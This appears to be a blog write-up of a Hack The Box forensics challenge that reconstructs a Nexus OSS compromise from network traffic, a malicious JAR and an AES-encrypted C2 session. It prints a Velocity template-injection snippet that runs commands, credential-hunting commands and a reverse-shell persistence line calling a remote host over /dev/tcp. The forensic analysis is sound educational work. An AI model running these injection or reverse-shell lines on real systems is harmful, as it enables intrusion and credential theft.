---
layout: post
title: "HTB CTF - Phantom Breach: Nexus OSS Attack Analysis"
date: 2026-02-20
categories: [ctf]
tags: [htb, pcap, wireshark, java, reverse-engineering, aes, nexus, network-forensics, dfir]
description: "Full writeup for the Phantom Breach CTF challenge - analyzing a malicious PCAP to uncover a Nexus OSS supply chain attack involving Java malware, AES-encrypted C2 traffic, and multi-layer obfuscated reverse shell payloads."
---

A forensics challenge involving network traffic analysis, Java reverse engineering, and AES-encrypted C2 communication. The attacker compromised a Nexus OSS repository manager to perform a supply chain attack.

## Description

> In an era fraught with cyber threats, Talion "Byte Doctor" Reyes, a former digital forensics examiner for an international crime lab, has uncovered evidence of a breach targeting critical systems vital to national infrastructure. Subtle traces of malicious activity point to a covert operation orchestrated by the Empire of Volnaya, a nation notorious for its expertise in cyber sabotage and hybrid warfare tactics.
>
> Can you analyze the digital remnants left behind, reconstruct the attack timeline, and uncover the full extent of the threat?

## Skills Required

- Network traffic analysis (Wireshark)
- Java decompilation and reverse engineering
- Bash obfuscation analysis
- AES decryption scripting (Python)

---

## Enumeration

The provided file is `capture.pcap` containing:
- **HTTP traffic** on port 8081 (default Nexus OSS port)
- **TCP encrypted traffic** on port 4444 (C2 channel)

---

## Q1 - Login Credentials

**Which credentials were used to login on the platform?**

Filter Wireshark for successful login requests:

```
http.response.code eq 200 && http.request.uri contains "/login"
```

Found an `Authorization: Basic` header. Decoded the base64 value:

```
YWRtaW5pc3RyYXRvcjpVQTE2azUxaGlJSG5ESXVMczA= → administrator:UA16k51hiIHnDIuLs0
```

**Answer: `administrator:UA16k51hiIHnDIuLs0`**

---

## Q2 - Nexus OSS Version

**Which Nexus OSS version is in use?**

From the same HTTP stream, the server response header reveals:

```
Server: Nexus/2.15.1-02 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
```

**Answer: `2.15.1-02`**

---

## Q3 - Attacker's Persistence Account

**The attacker created a new user for persistence. Which credentials were set?**

Filtered for `/users` endpoint. Found a `POST` request with a JSON body:

```json
{
  "data": {
    "userId": "adm1n1str4t0r",
    "firstName": "Persistent",
    "lastName": "Admin",
    "email": "adm1n1str4t0r@phoenix.htb",
    "status": "active",
    "roles": ["nx-admin"],
    "password": "46vaGuj566"
  }
}
```

**Answer: `adm1n1str4t0r:46vaGuj566`**

---

## Q4 - Tampered Java Library

**One core library written in Java has been tampered. Which is its package name?**

Listed all HTTP endpoints from the PCAP:

```bash
tshark -2 -r capture.pcap -Y "http.request" -T fields -e http.request.uri | sort -u
```

Output:
```
/nexus/service/local/authentication/login
/nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/snapshots/content/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar
/nexus/service/local/status
/nexus/service/local/users
```

Suspicious: `PhoenixCyberToolkit-1.0.jar` uploaded via a **PUT request** to Nexus.

The upload also contained embedded **Apache Velocity Template injection**:

```bash
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &"))
```

Exported the JAR from Wireshark (`File > Export Objects > HTTP`) and decompiled with **JD-GUI**. The package name was visible in the class structure.

**Answer: `com.phoenix.toolkit`**

---

## Q5 - AES Secret Key

**What is the secret key used for session encryption?**

The decompiled Java code used multi-layer obfuscation to hide the AES key. Recreated the logic in Python:

```python
import base64

def xYzWq8(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def fGhJk6(b64_encoded: bytes, key: int) -> str:
    raw = base64.b64decode(b64_encoded)
    return xYzWq8(raw, key).decode()

def make_encoded_var(original: str, key: int) -> bytes:
    return base64.b64encode(xYzWq8(original.encode(), key))

# Build encoded variables (as Java source does)
pKzLq7 = make_encoded_var("3t9834", 55)
wYrNb2 = make_encoded_var("s3cr",   77)
xVmRq1 = make_encoded_var("354r",   23)
aDsZx9 = make_encoded_var("34",     42)

# Decode the fragments
cWlNz5 = [
    fGhJk6(pKzLq7, 55),  # "3t9834"
    fGhJk6(wYrNb2, 77),  # "s3cr"
    fGhJk6(xVmRq1, 23),  # "354r"
    fGhJk6(aDsZx9, 42),  # "34"
]

# Reverse order using nQoMf6 = {3,2,1,0}
nQoMf6 = [3, 2, 1, 0]
pre_obfuscated_key = "".join(cWlNz5[i] for i in nQoMf6)

# Final character-level obfuscation
def gDF5a(s: str) -> str:
    result = ""
    for c in s:
        yTR8v = (((ord(c) ^ 7) + 33) % 94) + 33
        result += chr(yTR8v)
    return result

final_secret_key = gDF5a(pre_obfuscated_key)
print(f"PRE-OBFUSCATED KEY : {pre_obfuscated_key}")
print(f"FINAL SECRET KEY   : {final_secret_key}")
```

Output:
```
PRE-OBFUSCATED KEY : 34354rs3cr3t9834
FINAL SECRET KEY   : vuvtuYXvHYvW"#vu
```

**Answer: `vuvtuYXvHYvW"#vu`**

---

## Reconstructing the Obfuscated Key (Learning Section)

The obfuscation used **three layers**:

| Layer | Technique | Purpose |
|-------|-----------|---------|
| 1 | XOR + Base64 per fragment | Hide plaintext strings from static analysis |
| 2 | Array reordering with `nQoMf6 = {3,2,1,0}` | Prevent simple concatenation recovery |
| 3 | Per-character transformation `(((ord ^ 7) + 33) % 94) + 33` | Final output looks unrelated to input |

This is a common pattern in Java malware to protect C2 keys from `strings` extraction and quick reverse engineering.

---

## Q6 - AES Decryption Function Name

**Which function manages the AES string decryption process?**

From the decompiled code:

```java
private static String uJtXq5(String kVzNy4, String pWlXq7) throws Exception {
    SecretKeySpec bFyMp6 = new SecretKeySpec(pWlXq7.getBytes(StandardCharsets.UTF_8), "AES");
    Cipher tZrXq9 = Cipher.getInstance("AES");
    tZrXq9.init(2, bFyMp6);
    return new String(tZrXq9.doFinal(Base64.getDecoder().decode(kVzNy4)));
}
```

**Answer: `uJtXq5`**

---

## Q7 - Reverse Shell Trigger Command

**Which system command triggered the reverse shell execution?**

From the Velocity template injection in the HTTP traffic:

```bash
java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &
```

**Answer: `java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &`**

---

## Q8 - First Encrypted Command

**Which is the first executed command in the encrypted reverse shell session?**

Used the recovered AES key to decrypt the port 4444 TCP blobs. Script:

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

KEY = 'vuvtuYXvHYvW"#vu'.encode()  # 16 bytes = AES-128

def aes_ecb_decrypt(b64_string):
    raw = base64.b64decode(b64_string.strip())
    if len(raw) % 16 != 0:
        return None
    cipher = Cipher(algorithms.AES(KEY), modes.ECB(), backend=default_backend())
    dec = cipher.decryptor()
    pt = dec.update(raw) + dec.finalize()
    try:
        unpadder = padding.PKCS7(128).unpadder()
        pt = unpadder.update(pt) + unpadder.finalize()
    except Exception:
        pass
    try:
        text = pt.decode('utf-8').strip()
        printable = sum(1 for c in text if c.isprintable())
        if len(text) > 0 and printable / len(text) > 0.85:
            return text
    except Exception:
        pass
    return None

with open('blobs.txt') as f:
    blobs = [l.strip() for l in f if l.strip()]

for i, b64 in enumerate(blobs):
    result = aes_ecb_decrypt(b64)
    if result:
        print(f'[{i:02d}] {result[:120]}')
```

First decrypted command was `uname -a`.

**Answer: `uname -a`**

---

## Q8 - Full Decrypted Attack Session

### Phase 1: Reconnaissance

| Blob | Type | Content |
|------|------|---------|
| 00 | CMD | `uname -a` |
| 01 | OUT | `Linux phoenix-repo 5.15.0-134-generic #145-Ubuntu SMP Wed Feb 12 20:08:39 UTC 2025 x86_64` |
| 02 | CMD | `find / -name "sonatype-work" -type d` |

### Phase 2: Credential Hunting

| Blob | CMD |
|------|-----|
| 04 | `find /sonatype-work/storage/ -name "*.properties" \| xargs grep -l "password"` |
| 06 | `find /sonatype-work/storage/ -name "*.xml" \| xargs grep -l "password"` |
| 08 | `find /sonatype-work/ -name "*.bak"` |
| 10-16 | `grep -r "secret/apikey/token/jdbc" /sonatype-work/` |

### Phase 3: File Exfiltration

| Blob | Type | Content |
|------|------|---------|
| 21 | CMD | `ls -la /sonatype-work/conf/` |
| 25 | CMD | `cat /sonatype-work/conf/nexus.xml` |
| 27 | CMD | `cat /sonatype-work/conf/security.xml` |
| 28 | OUT | Full user database with password hashes |

---

## Q9 - Legitimate Admin User

**Which other legit user has admin permissions (excluding `adm1n1str4t0r` and `admin`)?**

Decrypted `security.xml` blob revealed all users and roles:

| User | Role | Admin? | Note |
|------|------|--------|------|
| deployment | nx-deployment | No | Plain SHA-1 hash (no salt!) |
| anonymous | repository-any-read | No | - |
| john_smith | nx-admin | **YES** | Legitimate user |
| brad_smith | nx-developer | No | - |
| admin | nx-admin | YES | Excluded |
| adm1n1str4t0r | nx-admin | YES | Excluded (attacker-created) |

Note: `adm1n1str4t0r` uses `@phoenix.htb` email domain vs `@corp.htb` for all legitimate users — a clear indicator it's a backdoor account.

**Answer: `john_smith`**

---

## Q10 - Persistence File Path

**Which file did the attacker write to for persistence?**

The final blob contained a **three-layer obfuscated shell payload**:

### Layer 1 - AES Decrypt → Base64 Encoded Bash
```bash
echo "Z0g0PSJF..." | base64 --decode | sh
```

### Layer 2 - Decode → Obfuscated Bash Variables
```bash
gH4="Ed";kM0="xSz";c="ch";L="4";s="'=ogclRXYk...' | r"
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```
Resolves to: `echo '<reversed_b64>' | base64 -d`

### Layer 3 - Reversed Base64 → Final Payload

The `s=` variable held a **reversed** base64 string (identified by `=` appearing at the start). After reversing and decoding:

```bash
echo "bash mi >& /dev/tcp/10.10.10.23/4444 0>&1" \
  > /sonatype-work/storage/.phoenix-updater \
  && chmod +x /sonatype-work/storage/.phoenix-updater
```

The attacker wrote a reverse shell to a hidden file disguised as a legitimate system updater.

**Answer: `/sonatype-work/storage/.phoenix-updater`**

---

## Attack Timeline Summary

```
1. Login as administrator using stolen credentials
2. Create backdoor admin account: adm1n1str4t0r
3. Upload malicious JAR via Nexus API
4. Trigger RCE via Velocity template injection
5. Execute JAR → establish AES-encrypted reverse shell on port 4444
6. Reconnaissance: uname -a, locate Nexus data directory
7. Credential harvesting: sweep all config files
8. Exfiltrate: nexus.xml, security.xml, security-configuration.xml
9. Plant persistence: write reverse shell to .phoenix-updater
```

---

*This writeup is for educational purposes. All analysis was performed in a controlled CTF environment.*
